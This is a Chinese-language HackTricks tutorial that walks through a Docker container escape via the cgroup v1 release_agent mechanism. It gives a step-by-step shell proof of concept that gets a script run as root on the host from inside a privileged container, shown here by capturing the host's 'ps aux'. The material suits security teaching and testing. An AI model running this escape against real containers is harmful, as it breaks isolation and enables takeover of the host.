# Docker release\_agent cgroups 逃逸

<details>

<summary><strong>从零开始学习AWS黑客技术，成为</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS 红队专家)</strong></a><strong>！</strong></summary>

支持HackTricks的其他方式：

* 如果你想在 **HackTricks中看到你的公司广告** 或 **下载HackTricks的PDF**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享你的黑客技巧。

</details>

### 分析概念验证

要触发这个漏洞，我们需要一个可以创建`release_agent`文件的cgroup，并通过杀死cgroup中的所有进程来触发`release_agent`的调用。最简单的方法是挂载一个cgroup控制器并创建一个子cgroup。

为此，我们创建一个`/tmp/cgrp`目录，挂载[RDMA](https://www.kernel.org/doc/Documentation/cgroup-v1/rdma.txt) cgroup控制器并创建一个子cgroup（为了本例，我们将其命名为“x”）。虽然并非所有cgroup控制器都经过测试，但这种技术应该适用于大多数cgroup控制器。

如果你跟随操作并遇到 **`mount: /tmp/cgrp: special device cgroup does not exist`**，这是因为你的设置没有RDMA cgroup控制器。**将`rdma`更改为`memory`即可解决问题**。我们使用RDMA是因为原始的概念验证只设计为与它一起工作。

请注意，cgroup控制器是全局资源，可以多次以不同权限挂载，一个挂载中的更改将应用于另一个挂载。

我们可以在下面看到“x”子cgroup的创建和它的目录列表。
```shell-session
root@b11cf9eab4fd:/# mkdir /tmp/cgrp && mount -t cgroup -o rdma cgroup /tmp/cgrp && mkdir /tmp/cgrp/x
root@b11cf9eab4fd:/# ls /tmp/cgrp/
cgroup.clone_children  cgroup.procs  cgroup.sane_behavior  notify_on_release  release_agent  tasks  x
root@b11cf9eab4fd:/# ls /tmp/cgrp/x
cgroup.clone_children  cgroup.procs  notify_on_release  rdma.current  rdma.max  tasks
```
接下来，我们通过向其 `notify_on_release` 文件**写入 1** 来**启用 cgroup** 对“x” cgroup 释放的通知。我们还设置 RDMA cgroup 释放代理来执行一个 `/cmd` 脚本——稍后我们将在容器中创建这个脚本——通过将 `/cmd` 脚本路径写入宿主机的 `release_agent` 文件。为此，我们将从 `/etc/mtab` 文件中获取容器在宿主机上的路径。

我们在容器中添加或修改的文件存在于宿主机上，可以从两个世界中修改它们：容器中的路径和宿主机上的路径。

下面可以看到这些操作：
```shell-session
root@b11cf9eab4fd:/# echo 1 > /tmp/cgrp/x/notify_on_release
root@b11cf9eab4fd:/# host_path=`sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab`
root@b11cf9eab4fd:/# echo "$host_path/cmd" > /tmp/cgrp/release_agent
```
注意我们将在主机上创建的 `/cmd` 脚本的路径：
```shell-session
root@b11cf9eab4fd:/# cat /tmp/cgrp/release_agent
/var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/cmd
```
现在，我们创建 `/cmd` 脚本，以便它将执行 `ps aux` 命令，并通过指定宿主机上输出文件的完整路径，将其输出保存到容器的 `/output` 中。最后，我们还打印 `/cmd` 脚本以查看其内容：
```shell-session
root@b11cf9eab4fd:/# echo '#!/bin/sh' > /cmd
root@b11cf9eab4fd:/# echo "ps aux > $host_path/output" >> /cmd
root@b11cf9eab4fd:/# chmod a+x /cmd
root@b11cf9eab4fd:/# cat /cmd
#!/bin/sh
ps aux > /var/lib/docker/overlay2/7f4175c90af7c54c878ffc6726dcb125c416198a2955c70e186bf6a127c5622f/diff/output
```
```markdown
最后，我们可以通过在“x”子 cgroup 内启动一个立即结束的进程来执行攻击。通过创建一个 `/bin/sh` 进程，并将其 PID 写入“x”子 cgroup 目录中的 `cgroup.procs` 文件，`/bin/sh` 退出后宿主机上的脚本将会执行。然后，宿主机上执行的 `ps aux` 输出被保存到容器内的 `/output` 文件中：
```
```shell-session
root@b11cf9eab4fd:/# sh -c "echo \$\$ > /tmp/cgrp/x/cgroup.procs"
root@b11cf9eab4fd:/# head /output
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         1  0.1  1.0  17564 10288 ?        Ss   13:57   0:01 /sbin/init
root         2  0.0  0.0      0     0 ?        S    13:57   0:00 [kthreadd]
root         3  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_gp]
root         4  0.0  0.0      0     0 ?        I<   13:57   0:00 [rcu_par_gp]
root         6  0.0  0.0      0     0 ?        I<   13:57   0:00 [kworker/0:0H-kblockd]
root         8  0.0  0.0      0     0 ?        I<   13:57   0:00 [mm_percpu_wq]
root         9  0.0  0.0      0     0 ?        S    13:57   0:00 [ksoftirqd/0]
root        10  0.0  0.0      0     0 ?        I    13:57   0:00 [rcu_sched]
root        11  0.0  0.0      0     0 ?        S    13:57   0:00 [migration/0]
```
### 参考资料

* [https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)

<details>

<summary><strong>通过</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>从零开始学习AWS黑客攻击！</strong></summary>

支持HackTricks的其他方式：

* 如果您希望在**HackTricks中看到您的公司广告**或**以PDF格式下载HackTricks**，请查看[**订阅计划**](https://github.com/sponsors/carlospolop)！
* 获取[**官方PEASS & HackTricks商品**](https://peass.creator-spring.com)
* 发现[**PEASS家族**](https://opensea.io/collection/the-peass-family)，我们独家的[**NFTs系列**](https://opensea.io/collection/the-peass-family)
* **加入** 💬 [**Discord群组**](https://discord.gg/hRep4RUj7f) 或 [**telegram群组**](https://t.me/peass) 或在 **Twitter** 🐦 上**关注**我 [**@carlospolopm**](https://twitter.com/carlospolopm)**。**
* **通过向** [**HackTricks**](https://github.com/carlospolop/hacktricks) 和 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github仓库提交PR来分享您的黑客技巧。

</details>
